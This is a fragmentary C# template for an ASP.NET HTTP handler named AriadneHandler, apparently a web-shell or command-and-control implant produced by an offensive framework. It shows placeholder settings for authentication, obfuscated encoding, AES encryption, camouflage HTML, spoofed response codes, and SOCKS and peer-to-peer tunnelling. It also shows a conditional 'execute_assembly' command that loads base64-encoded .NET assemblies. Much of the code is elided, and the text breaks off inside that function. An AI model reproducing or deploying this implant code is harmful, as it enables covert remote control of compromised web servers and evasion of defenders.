...
public class AriadneHandler : IHttpHandler, IRequiresSessionState
{
    ...
    private static readonly string ARIADNE_UUID = "%UUID%";
    private static readonly string ARIADNE_AUTH_METHOD = "%AUTH_METHOD%";
    private static readonly string ARIADNE_AUTH_NAME = "%AUTH_NAME%";
    private static readonly string ARIADNE_AUTH_VALUE = "%AUTH_VALUE%";
    private static readonly string ARIADNE_ENCODING = "%ENCODING%";
    private static readonly string ARIADNE_DEFORMED_ALPHABET = "%DEFORMED_ALPHABET%";
    private static readonly string ARIADNE_STANDARD_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    private static readonly string ARIADNE_ENCRYPTION = "%ENCRYPTION%";
    private static readonly string ARIADNE_AES_KEY = "%AES_KEY%";
    private static readonly string ARIADNE_REQUEST_TEMPLATE = "%REQUEST_TEMPLATE%";
    private static readonly string ARIADNE_REQUEST_PARAM = "%REQUEST_PARAM_NAME%";
    private static readonly string ARIADNE_CAMOUFLAGE_HTML = "%CAMOUFLAGE_HTML%";
    private static readonly int ARIADNE_RESPONSE_STATUS = %RESPONSE_STATUS_CODE%;
    private static readonly string ARIADNE_RESPONSE_CT = "%RESPONSE_CONTENT_TYPE%";
    private static readonly bool ARIADNE_ENABLE_SOCKS = %ENABLE_SOCKS%;
    private static readonly bool ARIADNE_ENABLE_P2P_HTTP = %ENABLE_P2P_HTTP%;
    private static readonly bool ARIADNE_ENABLE_P2P_TCP = %ENABLE_P2P_TCP%;
    private static readonly int ARIADNE_TCP_PORT = %TCP_PORT%;
    private static readonly bool ARIADNE_DEBUG = %DEBUG%;
...
[% if 'execute_assembly' in commands %]
            case "execute_assembly":
                string eaAssembly = parts.Length > 2 ? parts[2] : "";
                string eaArgs = parts.Length > 3 ? parts[3] : "";
                response = CmdExecuteAssembly(taskId, eaAssembly, eaArgs);
                break;
[% endif %]
...
[% if 'execute_assembly' in commands %]
    ...
    private static string CmdExecuteAssembly(string taskId, string b64Assembly, string arguments)
    {
        try
        {
